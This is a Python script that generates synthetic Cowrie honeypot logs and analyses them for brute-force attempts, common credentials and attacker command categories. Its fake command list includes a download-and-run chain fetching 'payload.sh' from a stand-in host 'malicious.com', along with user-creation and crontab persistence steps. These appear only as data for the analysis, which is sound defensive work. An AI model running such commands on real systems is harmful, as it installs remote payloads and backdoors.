import json
import hashlib
import random
from collections import Counter, defaultdict
from datetime import datetime, timedelta

LOG_FILE = "cowrie.json"
ANONYMISE_IPS = True
BRUTEFORCE_THRESHOLD = 5
BRUTEFORCE_WINDOW = timedelta(minutes=10)


def generate_fake_attacks():
    random.seed(42)
    fake_ips = [
        "192.168.1.10",
        "10.0.0.5",
        "172.16.0.3",
        "192.168.1.22",
        "10.0.0.9",
    ]
    fake_users = ["root", "admin", "ubuntu", "user", "test", "pi", 
"guest"]
    fake_passes = ["123456", "password", "admin", "root", "qwerty", 
"letmein"]
    fake_cmds = [
        "uname -a",
        "whoami",
        "wget http://malicious.com/payload.sh",
        "chmod +x payload.sh",
        "sh payload.sh",
        "useradd -m hacker",
        "crontab -e",
    ]

    events = []
    base_time = datetime(2025, 3, 15, 22, 0, 0)

    for i in range(200):
        ip = random.choice(fake_ips)
        ts = (base_time + timedelta(seconds=i * 18)).isoformat() + "Z"
        session = f"fakesession{random.randint(1000, 9999)}"

        events.append(
            {
                "eventid": "cowrie.login.failed",
                "src_ip": ip,
                "username": random.choice(fake_users),
                "password": random.choice(fake_passes),
                "timestamp": ts,
                "session": session,
            }
        )

        if i % 10 == 0:
            events.append(
                {
                    "eventid": "cowrie.login.success",
                    "src_ip": ip,
                    "timestamp": ts,
                    "session": session,
                }
            )

        for cmd in random.sample(fake_cmds, 3):
            events.append(
                {
                    "eventid": "cowrie.command.input",
                    "src_ip": ip,
                    "input": cmd,
                    "timestamp": ts,
                    "session": session,
                }
            )

    with open(LOG_FILE, "w", encoding="utf-8") as f:
        for event in events:
            f.write(json.dumps(event) + "\n")

    print(f"[+] Generated {len(events)} fake attack events")


def anonymise_ip(ip):
    if not ip:
        return "unknown"
    if ANONYMISE_IPS:
        return "anon_" + hashlib.sha256(ip.encode()).hexdigest()[:12]
    return ip


def parse_timestamp(ts):
    try:
        return datetime.fromisoformat(ts.replace("Z", ""))
    except Exception:
        return None


def classify_command(cmd):
    if not cmd:
        return "unknown"
    if cmd.startswith("wget") or cmd.startswith("curl"):
        return "malware_download"
    if cmd.startswith("chmod") or cmd.startswith("sh"):
        return "execution"
    if "passwd" in cmd or "useradd" in cmd:
        return "privilege_change"
    if "uname" in cmd or "whoami" in cmd:
        return "reconnaissance"
    return "other"


def main():
    src_ips = Counter()
    usernames = Counter()
    passwords = Counter()
    commands = Counter()
    sessions = set()

    hourly_attacks = Counter()
    command_categories = Counter()
    ip_user_map = defaultdict(set)
    ip_password_map = defaultdict(set)
    ip_timestamps = defaultdict(list)

    with open(LOG_FILE, "r", encoding="utf-8") as f:
        for line in f:
            try:
                event = json.loads(line)
            except json.JSONDecodeError:
                continue

            event_id = event.get("eventid")
            src_ip = anonymise_ip(event.get("src_ip", ""))
            username = event.get("username")
            password = event.get("password")
            session = event.get("session")
            command = event.get("input")
            timestamp = event.get("timestamp")

            if session:
                sessions.add(session)

            if timestamp:
                ts = parse_timestamp(timestamp)
                if ts:
                    hourly_attacks[ts.hour] += 1
                    if src_ip:
                        ip_timestamps[src_ip].append(ts)

            if event_id == "cowrie.login.failed":
                if src_ip:
                    src_ips[src_ip] += 1
                if username:
                    usernames[username] += 1
                    ip_user_map[src_ip].add(username)
                if password:
                    passwords[password] += 1
                    ip_password_map[src_ip].add(password)

            if event_id == "cowrie.command.input":
                if command:
                    commands[command] += 1
                    category = classify_command(command)
                    command_categories[category] += 1

    bruteforce_flagged = []
    for ip, timestamps in ip_timestamps.items():
        sorted_ts = sorted(timestamps)
        for i, start in enumerate(sorted_ts):
            count_in_window = sum(
                1 for t in sorted_ts[i:] if t - start <= BRUTEFORCE_WINDOW
            )
            if count_in_window >= BRUTEFORCE_THRESHOLD:
                bruteforce_flagged.append(ip)
                break

    print("\n=== Cowrie Honeypot Analysis ===\n")

    print("Top Source IPs:")
    for ip, hits in src_ips.most_common(5):
        print(f"{ip}: {hits}")

    print("\nTop Usernames:")
    for user, hits in usernames.most_common(5):
        print(f"{user}: {hits}")

    print("\nTop Passwords:")
    for pwd, hits in passwords.most_common(5):
        print(f"{pwd}: {hits}")

    print("\nTop Commands:")
    for cmd, count in commands.most_common(5):
        print(f"{cmd}: {count}")

    print(f"\nUnique Sessions: {len(sessions)}")

    print("\nAttacks by Hour:")
    for hour in range(24):
        print(f"{hour:02d}:00 - {hourly_attacks.get(hour, 0)} attacks")

    print("\nCommand Categories:")
    for cat, hits in command_categories.items():
        print(f"{cat}: {hits}")

    print("\nIP Behaviour Summary:")
    for ip, hits in src_ips.most_common(3):
        print(f"\nIP: {ip}")
        print(f" Attempts: {hits}")
        print(f" Usernames tried: {len(ip_user_map[ip])}")
        print(f" Passwords tried: {len(ip_password_map[ip])}")

    print("\nBruteforce-Flagged IPs:")
    if bruteforce_flagged:
        for ip in bruteforce_flagged:
            print(f" [!] {ip}")
    else:
        print(" None flagged.")

    with open("analysis_summary.txt", "w", encoding="utf-8") as out:
        out.write("Cowrie Honeypot Analysis Report\n\n")
        out.write(f"Unique sessions: {len(sessions)}\n\n")

        out.write("Top IPs:\n")
        for ip, hits in src_ips.most_common(5):
            out.write(f"{ip}: {hits}\n")

        out.write("\nTop Usernames:\n")
        for user, hits in usernames.most_common(5):
            out.write(f"{user}: {hits}\n")

        out.write("\nTop Passwords:\n")
        for pwd, hits in passwords.most_common(5):
            out.write(f"{pwd}: {hits}\n")

        out.write("\nTop Commands:\n")
        for cmd, hits in commands.most_common(5):
            out.write(f"{cmd}: {hits}\n")

        out.write("\nCommand Categories:\n")
        for cat, hits in command_categories.items():
            out.write(f"{cat}: {hits}\n")

        out.write("\nBruteforce-Flagged IPs:\n")
        if bruteforce_flagged:
            for ip in bruteforce_flagged:
                out.write(f"{ip}\n")
        else:
            out.write("None flagged.\n")

    print("\nAnalysis complete. Results saved to analysis_summary.txt\n")


if __name__ == "__main__":
    generate_fake_attacks()
    main()

